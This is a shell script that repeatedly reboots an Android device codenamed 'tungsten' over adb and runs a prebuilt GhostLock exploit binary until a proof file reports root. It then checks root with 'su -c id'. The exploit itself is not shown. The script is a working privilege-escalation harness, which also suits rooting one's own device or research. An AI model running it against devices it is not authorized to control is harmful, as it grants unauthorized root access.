#!/bin/sh
# GhostLock runner for tungsten. Loops reboot->exploit until ROOTED.
# Usage: ./run-tungsten.sh [tries]
set -e
cd "${GHOSTLOCK_DIR:-$(dirname "$0")/../GhostLock}"   # clone sshell/GhostLock into repo root, branch 5.4-tungsten
PRELOAD=build/tungsten/bin/preload
TRIES=${1:-30}
LOG=/data/local/tmp/ghostlock.log

for i in $(seq "$TRIES"); do
  echo "=== Attempt $i of $TRIES ==="
  adb reboot >/dev/null 2>&1 || true
  adb wait-for-device
  until [ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" = 1 ]; do
    sleep 2
  done
  sleep 3
  adb shell svc wifi disable >/dev/null 2>&1 || true

  adb push "$PRELOAD" /data/local/tmp/preload >/dev/null
  if [ -f ../ionstack.conf ]; then
    adb push ../ionstack.conf /data/local/tmp/ionstack.conf >/dev/null
  fi
  adb shell "chmod 755 /data/local/tmp/preload; rm -f /data/local/tmp/ghostlock.proof $LOG; nohup /data/local/tmp/preload >$LOG 2>&1 &"

  rooted=0
  for _ in $(seq 90); do
    sleep 2
    [ "$(adb get-state 2>/dev/null)" = device ] || break
    if adb shell "cat /data/local/tmp/ghostlock.proof" 2>/dev/null | grep -q ROOTED; then
      rooted=1
      break
    fi
  done

  echo "--- attempt $i log tail:"
  adb shell "tail -20 $LOG" 2>/dev/null || true

  if [ "$rooted" = 1 ]; then
    echo "=== ROOTED (attempt $i) ==="
    adb shell 'su -c id' 2>&1 || true
    exit 0
  fi
done
echo "=== NOT ROOTED after $TRIES tries ==="
exit 1
